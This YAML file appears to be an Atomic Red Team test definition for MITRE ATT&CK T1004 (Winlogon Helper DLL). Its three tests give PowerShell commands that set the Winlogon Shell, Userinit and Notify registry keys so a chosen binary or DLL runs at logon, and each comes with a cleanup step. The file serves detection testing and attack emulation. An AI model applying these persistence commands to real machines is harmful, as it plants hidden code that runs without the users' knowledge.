---
attack_technique: T1004
display_name: Winlogon Helper DLL

atomic_tests:
- name: Winlogon Shell Key Persistence - PowerShell
  description: |
    PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

  dependency_executor_name: powershell
  dependencies:
    - description: |
        shell key already exists. Run -Cleanup
      prereq_command: |
        try {Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" | Select-Object -ExpandProperty "Shell" -ErrorAction Stop | Out-Null; exit 1} catch {exit 0}

  supported_platforms:
    - windows

  input_arguments:
    binary_to_execute:
      description: Path of binary to execute
      type: Path
      default: C:\Windows\System32\cmd.exe

  executor:
    name: powershell
    elevation_required: false
    command: |
      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
    cleanup_command: |
      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force

- name: Winlogon Userinit Key Persistence - PowerShell
  description: |
    PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

  dependency_executor_name: powershell
  dependencies:
    - description: |
        Userinit key already exists. Run -Cleanup
      prereq_command: |
        try {Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" | Select-Object -ExpandProperty "Userinit" -ErrorAction Stop | Out-Null; exit 1} catch {exit 0}

  supported_platforms:
    - windows

  input_arguments:
    binary_to_execute:
      description: Path of binary to execute
      type: Path
      default: C:\Windows\System32\cmd.exe

  executor:
    name: powershell
    elevation_required: false
    command: |
      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
    cleanup_command: |
      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force

- name: Winlogon Notify Key Logon Persistence - PowerShell
  description: |
    PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.

  dependency_executor_name: powershell
  dependencies:
    - description: |
        HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify already exists. Run -Cleanup
      prereq_command: |
        if (Test-Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify") {exit 1} else {exit 0}

  supported_platforms:
    - windows

  input_arguments:
    binary_to_execute:
      description: Path of notification package to execute
      type: Path
      default: C:\Windows\Temp\atomicNotificationPackage.dll

  executor:
    name: powershell
    elevation_required: false
    command: |
      New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force
    cleanup_command: |
      Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
